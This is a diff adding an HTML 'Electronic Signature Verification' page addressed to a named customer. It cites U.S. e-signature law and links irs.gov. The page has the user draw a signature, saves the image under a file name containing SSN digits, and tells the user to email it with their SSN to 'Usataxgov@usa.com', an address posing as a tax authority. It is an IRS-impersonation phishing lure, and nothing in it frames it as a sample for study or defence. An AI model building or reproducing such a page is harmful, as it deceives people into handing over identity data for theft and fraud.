@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Electronic Signature Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1, h3 { color: #2c3e50; }
+        p { color: #34495e; line-height: 1.6; }
+        .form-group { margin: 15px 0; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #000;
+            border-radius: 4px;
+            box-sizing: border-box;
+            display: block;
+        }
+        canvas {
+            border: 2px solid #000;
+            border-radius: 4px;
+            background-color: #fff;
+            margin: 10px 0;
+            display: block;
+        }
+        button {
+            background-color: #3498db;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 5px;
+        }
+        button:hover { background-color: #2980b9; }
+        .clear-btn { background-color: #e74c3c; }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #7f8c8d;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Electronic Signature Verification</h1>
+        <h3>Customer: Barman Mohammadi</h3>
+        <p>
+            This page allows you to verify your electronic signature in compliance with U.S. federal and state laws, including the Electronic Signatures in Global and National Commerce Act (E-SIGN) and the Uniform Electronic Transactions Act (UETA). Please provide the required information and sign using your finger on the touchscreen.
+        </p>
+        <p>
+            After completing the form, save the signature as an image and email it along with your SSN to Usataxgov@usa.com.
+        </p>
+        <form id="signatureForm">
+            <div class="form-group">
+                <label for="ssn">Social Security Number (Last 4 Digits):</label>
+                <input type="text" id="ssn" name="ssn" maxlength="4" required>
+            </div>
+            <div class="form-group">
+                <label for="signature">Electronic Signature (Draw Below):</label>
+                <canvas id="signatureCanvas" width="400" height="150"></canvas>
+                <button type="button" class="clear-btn" onclick="clearCanvas()">Clear Signature</button>
+                <button type="button" onclick="saveSignature()">Save Signature</button>
+            </div>
+        </form>
+        <div class="footer">
+            <p>Compliant with U.S. E-SIGN Act and UETA | <a href="https://www.irs.gov" target="_blank">www.irs.gov</a></p>
+            <p>All Rights Reserved. © 2025</p>
+        </div>
+    </div>
+    <script>
+        const canvas = document.getElementById('signatureCanvas');
+        if (!canvas) {
+            alert('Canvas element not found. Please contact support.');
+            return;
+        }
+        const ctx = canvas.getContext('2d');
+        if (!ctx) {
+            alert('Canvas context not available. Please contact support.');
+            return;
+        }
+        let isDrawing = false;
+        ctx.strokeStyle = '#000';
+        ctx.lineWidth = 2;
+        function getEventPosition(e) {
+            const rect = canvas.getBoundingClientRect();
+            const clientX = e.clientX || (e.touches && e.touches[0].clientX);
+            const clientY = e.clientY || (e.touches && e.touches[0].clientY);
+            return {
+                x: clientX - rect.left,
+                y: clientY - rect.top
+            };
+        }
+        function startDrawing(e) {
+            isDrawing = true;
+            const pos = getEventPosition(e);
+            ctx.beginPath();
+            ctx.moveTo(pos.x, pos.y);
+        }
+        function draw(e) {
+            if (!isDrawing) return;
+            e.preventDefault();
+            const pos = getEventPosition(e);
+            ctx.lineTo(pos.x, pos.y);
+            ctx.stroke();
+        }
+        function stopDrawing() {
+            isDrawing = false;
+        }
+        canvas.addEventListener('mousedown', startDrawing);
+        canvas.addEventListener('mousemove', draw);
+        canvas.addEventListener('mouseup', stopDrawing);
+        canvas.addEventListener('mouseout', stopDrawing);
+        canvas.addEventListener('touchstart', startDrawing);
+        canvas.addEventListener('touchmove', draw);
+        canvas.addEventListener('touchend', stopDrawing);
+        function clearCanvas() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+        }
+        function saveSignature() {
+            const ssn = document.getElementById('ssn').value.trim();
+            if (!ssn) {
+                alert('Please enter the last 4 digits of your SSN.');
+                return;
+            }
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+            if (Array.from(imageData).every(pixel => pixel === 0)) {
+                alert('Please draw your signature in the canvas.');
+                return;
+            }
+            const signatureData = canvas.toDataURL('image/png');
+            const link = document.createElement('a');
+            link.href = signatureData;
+            link.download = `signature_${ssn}.png`;
+            link.click();
+            alert(`Signature saved as signature_${ssn}.png. Please email it with your SSN (${ssn}) to Usataxgov@usa.com.`);
+        }
+    </script>
+</body>
+</html>
